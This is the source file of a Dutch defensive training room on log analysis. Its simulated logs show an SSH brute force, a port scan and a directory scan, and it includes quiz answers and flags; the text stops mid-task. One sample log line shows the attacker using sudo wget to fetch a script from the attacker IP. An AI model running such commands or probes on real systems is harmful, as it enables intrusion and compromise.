/* Room: Logs lezen en aanvallen detecteren */

const AUTH_LOG = `Oct  3 02:01:14 srv-web01 sshd[1021]: Accepted password for deploy from 192.0.2.10 port 54110 ssh2
Oct  3 02:01:14 srv-web01 sshd[1021]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Oct  3 02:03:52 srv-web01 CRON[1105]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Oct  3 02:03:52 srv-web01 CRON[1105]: pam_unix(cron:session): session closed for user root
Oct  3 02:05:09 srv-web01 sshd[1140]: Failed password for root from 198.51.100.23 port 40122 ssh2
Oct  3 02:08:33 srv-web01 sshd[1152]: Accepted password for deploy from 192.0.2.10 port 54233 ssh2
Oct  3 02:08:33 srv-web01 sshd[1152]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
Oct  3 02:11:02 srv-web01 sshd[1210]: Failed password for root from 203.0.113.45 port 51001 ssh2
Oct  3 02:11:03 srv-web01 sshd[1211]: Failed password for root from 203.0.113.45 port 51002 ssh2
Oct  3 02:11:05 srv-web01 sshd[1212]: Failed password for admin from 203.0.113.45 port 51003 ssh2
Oct  3 02:11:06 srv-web01 sshd[1213]: Failed password for admin from 203.0.113.45 port 51004 ssh2
Oct  3 02:11:08 srv-web01 sshd[1214]: Invalid user testuser from 203.0.113.45 port 51005
Oct  3 02:11:08 srv-web01 sshd[1214]: Failed password for invalid user testuser from 203.0.113.45 port 51005 ssh2
Oct  3 02:11:10 srv-web01 sshd[1215]: Failed password for postgres from 203.0.113.45 port 51006 ssh2
Oct  3 02:11:12 srv-web01 sshd[1216]: Failed password for oracle from 203.0.113.45 port 51007 ssh2
Oct  3 02:11:30 srv-web01 sshd[1221]: Failed password for mdevries from 203.0.113.45 port 51010 ssh2
Oct  3 02:11:33 srv-web01 sshd[1222]: Failed password for mdevries from 203.0.113.45 port 51011 ssh2
Oct  3 02:11:36 srv-web01 sshd[1223]: Failed password for mdevries from 203.0.113.45 port 51012 ssh2
Oct  3 02:11:39 srv-web01 sshd[1224]: Failed password for mdevries from 203.0.113.45 port 51013 ssh2
Oct  3 02:11:42 srv-web01 sshd[1225]: Failed password for mdevries from 203.0.113.45 port 51014 ssh2
Oct  3 02:11:45 srv-web01 sshd[1226]: Failed password for mdevries from 203.0.113.45 port 51015 ssh2
Oct  3 02:11:48 srv-web01 sshd[1227]: Failed password for mdevries from 203.0.113.45 port 51016 ssh2
Oct  3 02:11:51 srv-web01 sshd[1228]: Failed password for mdevries from 203.0.113.45 port 51017 ssh2
Oct  3 02:11:55 srv-web01 sshd[1229]: Accepted password for mdevries from 203.0.113.45 port 51018 ssh2
Oct  3 02:11:55 srv-web01 sshd[1229]: pam_unix(sshd:session): session opened for user mdevries(uid=1007) by (uid=0)  [soc-tag: JVT{geslaagde_brute_force}]
Oct  3 02:12:40 srv-web01 sudo:  mdevries : TTY=pts/0 ; PWD=/home/mdevries ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
Oct  3 02:12:48 srv-web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by mdevries(uid=1007)
Oct  3 02:13:05 srv-web01 CRON[1388]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
Oct  3 02:15:20 srv-web01 sshd[1301]: Accepted password for deploy from 192.0.2.10 port 54780 ssh2
Oct  3 02:15:20 srv-web01 sshd[1301]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
`;

const ACCESS_LOG = `192.0.2.51 - - [03/Oct/2026:03:05:02 +0200] "GET / HTTP/1.1" 200 2310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
192.0.2.51 - - [03/Oct/2026:03:05:03 +0200] "GET /css/stijl.css HTTP/1.1" 200 1840 "https://winkel.jvt.lab/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
198.51.100.9 - - [03/Oct/2026:03:06:44 +0200] "GET /producten HTTP/1.1" 200 5120 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
192.0.2.51 - - [03/Oct/2026:03:07:11 +0200] "GET /contact HTTP/1.1" 200 1990 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
192.0.2.77 - - [03/Oct/2026:03:09:48 +0200] "GET /producten/koffie HTTP/1.1" 200 3050 "-" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
203.0.113.88 - - [03/Oct/2026:03:12:01 +0200] "GET /admin HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:01 +0200] "GET /administrator HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:02 +0200] "GET /wp-login.php HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:02 +0200] "GET /wp-admin/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:03 +0200] "GET /phpmyadmin/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:03 +0200] "GET /.git/config HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:04 +0200] "GET /backup.zip HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:04 +0200] "GET /config.php HTTP/1.1" 403 289 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:05 +0200] "GET /server-status HTTP/1.1" 403 289 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:05 +0200] "GET /vendor/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:06 +0200] "GET /.env HTTP/1.1" 200 742 "-" "dirsearch/0.4.3 (JVT{dotenv_gelekt})"
203.0.113.88 - - [03/Oct/2026:03:12:06 +0200] "GET /uploads/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
203.0.113.88 - - [03/Oct/2026:03:12:07 +0200] "GET /old/ HTTP/1.1" 404 512 "-" "dirsearch/0.4.3"
198.51.100.9 - - [03/Oct/2026:03:14:20 +0200] "GET /producten/thee HTTP/1.1" 200 2980 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
192.0.2.77 - - [03/Oct/2026:03:15:58 +0200] "POST /contact HTTP/1.1" 200 640 "https://winkel.jvt.lab/contact" "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
192.0.2.51 - - [03/Oct/2026:03:16:40 +0200] "GET /favicon.ico HTTP/1.1" 200 318 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/128.0"
198.51.100.9 - - [03/Oct/2026:03:18:02 +0200] "GET / HTTP/1.1" 200 2310 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5) Safari/605.1"
`;

const FW_LOG = `Oct  3 04:01:40 fw01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.0.2.51 DST=10.0.5.20 PROTO=TCP SPT=51880 DPT=443 FLAGS=SYN
Oct  3 04:01:55 fw01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=198.51.100.9 DST=10.0.5.20 PROTO=TCP SPT=49220 DPT=443 FLAGS=SYN
Oct  3 04:02:10 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44001 DPT=21 FLAGS=SYN
Oct  3 04:02:10 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44002 DPT=22 FLAGS=SYN
Oct  3 04:02:10 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44003 DPT=23 FLAGS=SYN
Oct  3 04:02:11 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44004 DPT=25 FLAGS=SYN
Oct  3 04:02:11 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44005 DPT=53 FLAGS=SYN
Oct  3 04:02:11 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44006 DPT=80 FLAGS=SYN
Oct  3 04:02:11 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44007 DPT=110 FLAGS=SYN
Oct  3 04:02:12 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44008 DPT=135 FLAGS=SYN
Oct  3 04:02:12 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44009 DPT=139 FLAGS=SYN
Oct  3 04:02:12 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44010 DPT=143 FLAGS=SYN
Oct  3 04:02:12 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44011 DPT=445 FLAGS=SYN
Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44012 DPT=993 FLAGS=SYN
Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44013 DPT=3306 FLAGS=SYN
Oct  3 04:02:13 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44014 DPT=3389 FLAGS=SYN
Oct  3 04:02:14 fw01 kernel: [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.200 DST=10.0.5.20 PROTO=TCP SPT=44015 DPT=8080 FLAGS=SYN
Oct  3 04:02:40 ids01 suricata[912]: [1:2001219:20] ET SCAN Possible TCP SYN port scan SRC=203.0.113.200 DST=10.0.5.20 classification=Attempted-Recon note=JVT{poortscan_gedetecteerd}
Oct  3 04:05:02 fw01 kernel: [UFW ALLOW] IN=eth0 OUT= SRC=192.0.2.77 DST=10.0.5.20 PROTO=TCP SPT=52110 DPT=443 FLAGS=SYN
`;

CS.registerRoom({
  id: 'logs-detectie',
  path: 'defensief',
  order: 1,
  title: 'Logs lezen en aanvallen detecteren',
  icon: '📊',
  difficulty: 'Gemiddeld',
  minutes: 65,
  summary: 'Blue team-werk: begrijpen wat logs zijn, wat een SIEM, IDS/IPS en SOC doen, en in echte logregels een brute force, een poortscan en een verdachte webscan opsporen.',
  objectives: [
    'Uitleggen wat logs zijn en welke soorten je als verdediger tegenkomt (auth.log, webserver-access-log, firewall, Windows Security)',
    'De begrippen SIEM, IDS/IPS, SOC, alert en false positive uitleggen',
    'Uitleggen wat Indicators of Compromise (IoC) zijn en voorbeelden geven',
    'In een auth.log een geslaagde brute force herkennen en het aanvaller-IP isoleren',
    'In een webserver-access-log een directory-/padscan herkennen en de afwijkende 200 vinden',
    'Een poortscan herkennen in een firewalllog en filteren met tekst en /regex/',
  ],
  tasks: [
    {
      title: 'Taak 1 — Wat zijn logs?',
      content: `
        <p>Elk systeem houdt een dagboek bij. Een server, een firewall, een webapplicatie, je laptop: ze schrijven
        voortdurend op wat er gebeurt. Die regels samen heten <strong>logs</strong> (logbestanden). Voor een
        verdediger (<em>blue team</em>) zijn ze goud waard, want een aanvaller laat bijna altijd sporen na in de logs,
        ook als hij denkt onzichtbaar te zijn.</p>

        <h3>De analogie van de bewakingscamera</h3>
        <p>Denk aan de camerabeelden van een winkel. Normaal kijkt niemand ernaar. Maar is er iets gestolen, dan spoel
        je terug en zie je precies wie wanneer binnenkwam en wat hij deed. Logs zijn de camerabeelden van je IT: saai
        tot het moment dat je ze nodig hebt, en dan onmisbaar.</p>

        <h3>Soorten logs die je veel ziet</h3>
        <ul>
          <li><strong>auth.log</strong> (Linux) — aanmeldingen en authenticatie. Geslaagde en mislukte logins,
          <code>sudo</code>-gebruik, nieuwe sessies. Hier zie je brute force op SSH terug.</li>
          <li><strong>Webserver-access-log</strong> (Apache/nginx) — elk HTTP-verzoek naar je website: het IP, het
          pad, de statuscode (<code>200</code> gelukt, <code>404</code> niet gevonden, <code>403</code> verboden) en
          de User-Agent. Hier zie je scans en aanvallen op je site.</li>
          <li><strong>Firewalllog</strong> — welke verbindingen werden toegestaan (ALLOW) of geblokkeerd (BLOCK). Hier
          zie je poortscans en verkeer dat niet hoort.</li>
          <li><strong>Windows Security-events</strong> — aanmeldingen en beheeracties, met event-ID's zoals
          <code>4624</code> (geslaagde login) en <code>4625</code> (mislukte login). Zie ook de Windows-room.</li>
        </ul>

        <div class="callout info">
          <strong>Tijd en tijdzones:</strong> bijna elke logregel begint met een tijdstempel. Bij een onderzoek zet
          je gebeurtenissen uit verschillende systemen op één tijdlijn. Lopen de klokken niet gelijk (geen
          tijdsynchronisatie via NTP), dan wordt dat een puzzel. Goede tijdsynchronisatie is dus een beveiligingszaak.
        </div>

        <h3>Waarom logs centraal verzamelen?</h3>
        <p>Eén server met logs is te overzien. Maar een bedrijf heeft honderden systemen. Daarom stuur je logs naar
        één centrale plek. Dat heeft twee grote voordelen: je kunt over alle systemen heen zoeken, en een aanvaller
        die op één machine zijn sporen wist, krijgt de centrale kopie niet weg. In de volgende taak kijken we naar de
        gereedschappen die dat doen.</p>
      `,
      questions: [
        { q: "In welk logbestand op Linux zie je mislukte en geslaagde aanmeldingen (SSH, sudo)?", answer: ["auth.log", "/var/log/auth.log"], hint: "De naam verwijst naar authenticatie.", explain: "auth.log legt authenticatie vast: logins, sudo en nieuwe sessies." },
        { q: "Welke HTTP-statuscode betekent 'niet gevonden'?", options: ["200", "403", "404", "500"], answer: 2, explain: "404 = Not Found. Veel 404's achter elkaar van één IP wijzen vaak op een scan." },
        { q: "Waarom stuur je logs naar een centrale plek in plaats van ze alleen lokaal te laten staan?", options: ["Je kunt over alle systemen heen zoeken en een aanvaller kan de centrale kopie niet wissen", "Het is goedkoper dan lokale opslag", "Logs nemen lokaal te veel ruimte in", "Het is wettelijk verboden om lokaal te loggen"], answer: 0, explain: "Centraal verzamelen maakt zoeken mogelijk en beschermt de logs tegen een aanvaller die lokaal wist." },
      ],
    },

    {
      title: "Taak 2 — SIEM, IDS/IPS en het SOC",
      content: `
        <p>Niemand leest met de hand duizenden logregels per minuut. Daar zijn gereedschappen en teams voor. Leer deze
        afkortingen, want je komt ze overal tegen.</p>

        <h3>SIEM: het verzamel- en zoeksysteem</h3>
        <p>Een <strong>SIEM</strong> (Security Information and Event Management) verzamelt logs van al je systemen op
        één plek, maakt ze doorzoekbaar en legt er regels overheen. Zie het als een enorme zoekmachine met alarmbellen:
        je kunt zoeken ("laat alle mislukte logins van dit IP zien") en je stelt regels in die automatisch een
        <strong>alert</strong> (waarschuwing) geven, bijvoorbeeld "meer dan 10 mislukte logins binnen een minuut".</p>

        <h3>IDS en IPS: de bewegingsmelder</h3>
        <ul>
          <li>Een <strong>IDS</strong> (Intrusion Detection System) kijkt naar verkeer of logs en <em>meldt</em>
          verdachte patronen. Het slaat alarm, maar grijpt niet in.</li>
          <li>Een <strong>IPS</strong> (Intrusion Prevention System) doet hetzelfde, maar mag ook <em>ingrijpen</em>:
          het blokkeert de verbinding meteen.</li>
        </ul>
        <p>Het verschil in één zin: een IDS is een bewegingsmelder die een belletje laat rinkelen, een IPS is er een
        die meteen de deur op slot doet. Systemen als Suricata en Snort zijn bekende voorbeelden.</p>

        <h3>Het SOC: de mensen</h3>
        <p>Een <strong>SOC</strong> (Security Operations Center) is het team (en de ruimte) dat dag en nacht naar de
        alerts kijkt en erop reageert. Een SOC-analist beoordeelt elke melding: is dit echt een aanval, of loos alarm?</p>

        <h3>True en false positives</h3>
        <p>Niet elke alert is raak. Vier mogelijke uitkomsten:</p>
        <table>
          <thead><tr><th></th><th>Er is echt iets mis</th><th>Er is niets mis</th></tr></thead>
          <tbody>
            <tr><td><strong>Alarm gaat af</strong></td><td>True positive (terecht alarm)</td><td>False positive (loos alarm)</td></tr>
            <tr><td><strong>Alarm blijft stil</strong></td><td>False negative (gemiste aanval)</td><td>True negative (terecht stil)</td></tr>
          </tbody>
        </table>
        <div class="callout warn">
          <strong>Let op de balans:</strong> zet je de regels te streng, dan verzuip je in <em>false positives</em> en
          raken analisten afgestompt ("alarmmoeheid"), waardoor ze een echte aanval missen. Zet je ze te soepel, dan
          krijg je <em>false negatives</em>: aanvallen glippen er ongemerkt doorheen. Goede detectie is die balans
          vinden.
        </div>
      `,
      questions: [
        { q: "Wat is het belangrijkste verschil tussen een IDS en een IPS?", options: ["Een IPS kan ingrijpen en blokkeren, een IDS meldt alleen", "Een IDS is nieuwer dan een IPS", "Een IPS werkt alleen op Windows", "Er is geen verschil"], answer: 0, explain: "IDS = alleen detecteren/melden, IPS = ook voorkomen/blokkeren." },
        { q: "Hoe heet het systeem dat logs van al je systemen verzamelt, doorzoekbaar maakt en alerts genereert?", answer: ["SIEM", "siem"], hint: "Security Information and Event Management.", explain: "Een SIEM is de centrale zoek- en alertmachine van een SOC." },
        { q: "Een alert gaat af, maar na onderzoek blijkt er niets aan de hand. Hoe heet dat?", options: ["False positive", "True positive", "False negative", "True negative"], answer: 0, explain: "Een loos alarm is een false positive. Te veel ervan leidt tot alarmmoeheid." },
        { q: "Hoe heet het team dat dag en nacht naar beveiligingsalerts kijkt en erop reageert?", answer: ["SOC", "soc", "Security Operations Center"], hint: "Drie letters, eindigt op C.", explain: "Het SOC (Security Operations Center) bemant de detectie en respons." },
      ],
    },

    {
      title: "Taak 3 — Indicators of Compromise (IoC)",
      content: `
        <p>Als je een aanval onderzoekt, zoek je naar sporen die verraden dat er iets mis is. Zulke sporen heten
        <strong>Indicators of Compromise</strong> (IoC), oftewel aanwijzingen van een inbraak. Vind je een IoC op een
        systeem, dan is dat een sterk signaal dat het systeem is aangevallen of overgenomen.</p>

        <h3>De analogie van de inbraak</h3>
        <p>Bij een woninginbraak zijn de IoC's: een opengebroken raam, modderige voetafdrukken, een ontbrekende tv. Je
        ziet de dief niet meer, maar de sporen vertellen het verhaal. In IT werkt het net zo.</p>

        <h3>Veelvoorkomende IoC's</h3>
        <ul>
          <li><strong>Verdachte IP-adressen en domeinen</strong> — een IP dat tientallen mislukte logins veroorzaakt,
          of verkeer naar een bekend kwaadaardig domein.</li>
          <li><strong>Bestandshashes</strong> — de "vingerafdruk" (bijv. een SHA-256) van een bekend stuk malware. Komt
          die hash op jouw systeem voor, dan staat de malware erop.</li>
          <li><strong>Vreemde User-Agents</strong> — scan- en hacktools zetten vaak een opvallende User-Agent in hun
          verzoeken, zoals <code>dirsearch</code> of <code>sqlmap</code>, in plaats van een gewone browser.</li>
          <li><strong>Afwijkende tijdstippen en volumes</strong> — een login om 03:00 's nachts, of plots enorm veel
          data die naar buiten gaat.</li>
          <li><strong>Nieuwe accounts, taken of processen</strong> — een gebruikersaccount dat niemand heeft
          aangemaakt, of een onbekend proces dat bij elke herstart opstart (persistentie).</li>
        </ul>

        <div class="callout tip">
          <strong>Tip:</strong> één IoC op zichzelf hoeft niets te betekenen (één mislukte login is een typefout).
          Het gaat om het <em>patroon</em> en de <em>combinatie</em>: veel mislukte logins, gevolgd door een geslaagde,
          gevolgd door een nieuw account — dát is een verhaal. In de volgende taken leer je zulke verhalen uit ruwe
          logs te vissen.
        </div>

        <h3>IoC's delen</h3>
        <p>Organisaties delen IoC's met elkaar, zodat iedereen zich kan wapenen tegen een nieuwe aanval. In Nederland
        speelt het <strong>NCSC</strong> (Nationaal Cyber Security Centrum) hierin een rol: het waarschuwt organisaties
        en deelt informatie over actuele dreigingen. Herken je een IoC uit zo'n waarschuwing in je eigen logs, dan weet
        je dat je doelwit bent.</p>
      `,
      questions: [
        { q: "Waar staat de afkorting IoC voor?", answer: ["Indicator of Compromise", "Indicators of Compromise", "indicator of compromise"], hint: "Een aanwijzing (indicator) van een inbraak (compromise).", explain: "Een IoC is een spoor dat verraadt dat een systeem is aangevallen of overgenomen." },
        { q: "Welke van deze is een typische IoC?", options: ["De vingerafdruk (hash) van een bekend stuk malware", "Een geldig TLS-certificaat", "Een gewone browser-User-Agent", "Een geslaagde update"], answer: 0, explain: "Een bekende malware-hash op je systeem is een sterke aanwijzing van besmetting." },
        { q: "Welke Nederlandse organisatie waarschuwt bedrijven en deelt informatie over actuele cyberdreigingen?", answer: ["NCSC", "ncsc", "Nationaal Cyber Security Centrum"], hint: "Nationaal Cyber Security Centrum.", explain: "Het NCSC deelt dreigingsinformatie en IoC's met Nederlandse organisaties." },
      ],
    },

    {
      title: "Taak 4 — Brute force opsporen in auth.log",
      content: `
        <p>Tijd om zelf te graven. Hieronder zie je een stuk uit een <code>/var/log/auth.log</code> van een Linux-server
        (<code>srv-web01</code>). Ergens zit een complete <strong>brute force</strong> verstopt: een aanvaller die
        automatisch honderden wachtwoorden probeert tot er één klopt. Jouw taak is het spoor te volgen.</p>

        <h3>Zo werkt het filter</h3>
        <p>De logviewer heeft onderaan een filter en een teller. Je kunt op twee manieren filteren:</p>
        <ul>
          <li><strong>Gewone tekst</strong> — typ bijvoorbeeld <code>Failed password</code> om alleen de mislukte
          aanmeldingen te zien, of een IP-adres om alles van dat IP te zien.</li>
          <li><strong>Reguliere expressie (regex)</strong> — zet je zoekterm tussen schuine strepen, bijvoorbeeld
          <code>/Failed password.*203.0.113.45/</code>. Dat matcht alleen regels waarin <em>eerst</em> "Failed password"
          staat en <em>daarna</em> dat IP. De <code>.*</code> betekent "willekeurig veel tekens ertussen".</li>
        </ul>

        <h3>Het spoor volgen</h3>
        <ol>
          <li><strong>Vind de dader.</strong> Filter op <code>Failed password</code>. Je ziet een stortvloed van
          mislukte pogingen. Let op welk IP-adres steeds terugkomt — dat is de aanvaller. Eén losse mislukking van een
          ander IP is ruis.</li>
          <li><strong>Tel de pogingen.</strong> Filter met de regex <code>/Failed password.*203.0.113.45/</code> en
          kijk naar de teller onderaan.</li>
          <li><strong>Vind het moment van inbraak.</strong> Net na de reeks mislukkingen staat een
          <code>Accepted password</code> vanaf datzelfde IP: de brute force is geslaagd. Noteer welke gebruiker werd
          gekraakt.</li>
          <li><strong>Vind de vlag.</strong> Direct onder de geslaagde login staat de regel waarin de SSH-sessie wordt
          geopend. Een SOC-analist heeft daar een notitie (een <em>soc-tag</em>) aan gehangen. Daarin staat de vlag.</li>
        </ol>

        <div class="callout tip">
          <strong>Filtertip:</strong> typ <code>203.0.113.45</code> om alles van de aanvaller te zien, inclusief de
          geslaagde login, de sessie-notitie en wat hij daarna met <code>sudo</code> deed. Zo zie je in één oogopslag
          het hele verhaal: binnenkomen, inloggen, rechten verhogen.
        </div>
      `,
      lab: {
        type: "logs",
        title: "/var/log/auth.log — srv-web01",
        lines: AUTH_LOG,
      },
      questions: [
        { q: "Vanaf welk IP-adres komt de brute force?", answer: ["203.0.113.45"], hint: "Filter op 'Failed password' en kijk welk IP steeds terugkomt.", explain: "Alle mislukte pogingen en de uiteindelijke geslaagde login komen van 203.0.113.45." },
        { q: "Filter met /Failed password.*203.0.113.45/. Hoeveel mislukte pogingen van de aanvaller zie je?", answer: ["15"], hint: "Lees de teller onderaan de viewer af.", explain: "Er zijn 15 'Failed password'-regels vanaf 203.0.113.45 — op diverse gebruikersnamen, eindigend met 8 pogingen op mdevries." },
        { q: "Welke gebruiker werd uiteindelijk gekraakt (Accepted password vanaf het aanvaller-IP)?", answer: ["mdevries"], hint: "Zoek de 'Accepted password'-regel van 203.0.113.45.", explain: "Na de reeks mislukkingen lukt het bij mdevries: Accepted password for mdevries from 203.0.113.45." },
        { q: "Wat is de vlag in de soc-tag bij de geopende sessie?", answer: ["JVT{geslaagde_brute_force}"], hint: "Kijk op de 'session opened'-regel direct onder de geslaagde login.", explain: "De analist tagde het incident: JVT{geslaagde_brute_force}." },
      ],
    },

    {
      title: "Taak 5 — Een poortscan herkennen in de firewalllog",
      content: `
        <p>Voordat een aanvaller inbreekt, wil hij weten welke deuren er zijn. Daarom doet hij een <strong>poortscan</strong>
        (Engels: <em>port scan</em>): hij klopt kort op heel veel poorten van een systeem om te zien welke open staan.
        Poort 22 (SSH), 80 (HTTP), 443 (HTTPS), 3389 (Windows-afstandsbediening), 3306 (database): elk open poort is een
        mogelijke ingang. In de firewalllog ziet dat er heel kenmerkend uit.</p>

        <h3>De analogie van de inbreker</h3>
        <p>Een inbreker die langs een rij huizen loopt en bij elk huis even aan de deurklink voelt, valt op. Eén deur
        proberen is normaal; vijftien deuren in tien seconden is een patroon. In de firewalllog is dat precies wat je
        ziet: één bron-IP (<code>SRC</code>) dat in korte tijd heel veel <em>verschillende</em> doelpoorten
        (<code>DPT</code>) probeert bij hetzelfde doel (<code>DST</code>).</p>

        <h3>De log lezen</h3>
        <p>Elke regel toont of het verkeer werd toegestaan (<code>[UFW ALLOW]</code>) of geblokkeerd
        (<code>[UFW BLOCK]</code>), met het bron-IP (<code>SRC</code>), doel-IP (<code>DST</code>) en de doelpoort
        (<code>DPT</code>). Gebruik het filter:</p>
        <ul>
          <li>Filter op <code>UFW BLOCK</code> om alleen de geblokkeerde pogingen te zien.</li>
          <li>Filter op het bron-IP om alle pogingen van die ene bron te tellen.</li>
          <li>Onderaan staat ook een <strong>IDS-alert</strong> van Suricata die de scan automatisch herkende. In de
          notitie (<code>note=</code>) van die alert staat de vlag.</li>
        </ul>

        <div class="callout info">
          <strong>Firewall versus IDS, samen sterk:</strong> de firewall blokkeerde de losse verbindingen al, maar zag
          niet meteen het grotere patroon. De IDS (Suricata) legde de losse pogingen naast elkaar en concludeerde:
          dit is een scan. Zo vullen techniek (firewall) en detectie (IDS) elkaar aan.
        </div>
      `,
      lab: {
        type: "logs",
        title: "Firewall + IDS — fw01 / ids01",
        lines: FW_LOG,
      },
      questions: [
        { q: "Vanaf welk IP-adres komt de poortscan?", answer: ["203.0.113.200"], hint: "Filter op 'UFW BLOCK' en kijk welk SRC-IP steeds terugkomt.", explain: "Alle geblokkeerde pogingen komen van SRC=203.0.113.200." },
        { q: "Welk doel-IP (DST) werd gescand?", answer: ["10.0.5.20"], hint: "Kijk naar het DST-veld op de BLOCK-regels.", explain: "De scan is gericht op DST=10.0.5.20." },
        { q: "Hoeveel verschillende poorten (DPT) probeerde de aanvaller (de geblokkeerde pogingen)?", answer: ["15"], hint: "Filter op 'UFW BLOCK' en tel de regels; elke BLOCK-regel is een andere DPT.", explain: "Er staan 15 geblokkeerde pogingen, elk naar een andere doelpoort: een klassieke poortscan." },
        { q: "Wat is de vlag in de note van de Suricata IDS-alert?", answer: ["JVT{poortscan_gedetecteerd}"], hint: "Zoek de regel met 'suricata' en lees het note=-veld.", explain: "De IDS herkende het patroon en noteerde: JVT{poortscan_gedetecteerd}." },
      ],
    },

    {
      title: "Taak 6 — Verdachte webverzoeken in het access-log",
      content: `
        <p>Een website krijgt verkeer van echte bezoekers, maar ook van aanvallers die op zoek zijn naar vergeten
        beheerpagina's, back-ups en configuratiebestanden. Dat heet een <strong>directory-</strong> of
        <strong>padscan</strong>: automatisch honderden bekende paden proberen en kijken wat bestaat. In het
        webserver-access-log (hier van <code>winkel.jvt.lab</code>) laat dat een duidelijk spoor na.</p>

        <h3>Wat je zoekt</h3>
        <ol>
          <li><strong>De scanner.</strong> Echte bezoekers vragen een paar bestaande pagina's op (status
          <code>200</code>). Een scanner vuurt in enkele seconden tientallen verzoeken af naar paden die niet bestaan
          (<code>404</code>) of verboden zijn (<code>403</code>): <code>/admin</code>, <code>/wp-login.php</code>,
          <code>/phpmyadmin/</code>, <code>/.git/config</code>. Filter op <code>404</code> en kijk welk IP de meeste
          veroorzaakt.</li>
          <li><strong>De buit.</strong> Te midden van alle <code>404</code>'s zit precies één gevoelig pad dat
          <em>wél</em> status <code>200</code> gaf — dat bestand bestaat dus en is per ongeluk bereikbaar. Dat is de
          treffer die de aanvaller zocht. Zoek die ene afwijkende <code>200</code> van het scanner-IP.</li>
          <li><strong>De vlag.</strong> Lees de <strong>User-Agent</strong> (het laatste deel tussen aanhalingstekens)
          van die geslaagde aanvraag. De aanvaller heeft daar een markering in gezet. Daarin staat de vlag.</li>
        </ol>

        <h3>Slim filteren met regex</h3>
        <div class="callout tip">
          <strong>Filtertip:</strong> met de regex <code>/" 200 /</code> vind je alle verzoeken met statuscode 200.
          Combineer dat in je hoofd met het scanner-IP, of filter eerst op het scanner-IP en zoek dan de regel met
          <code>.env</code>. Een scanner herken je ook aan zijn User-Agent: een gewone bezoeker heet "Mozilla/5.0 ...",
          maar hier staat een scantool genoemd in plaats van een browser. Die User-Agent is zelf al een IoC.
        </div>

        <p>Dit is dagelijks SOC-werk: uit duizenden regels de ene treffer vissen die er echt toe doet. Zie je dat een
        configuratiebestand als <code>/.env</code> (met wachtwoorden en sleutels erin) bereikbaar was, dan is dat een
        datalek-in-wording en begint de incidentrespons — het onderwerp van de volgende room.</p>
      `,
      lab: {
        type: "logs",
        title: "/var/log/nginx/access.log — winkel.jvt.lab",
        lines: ACCESS_LOG,
      },
      questions: [
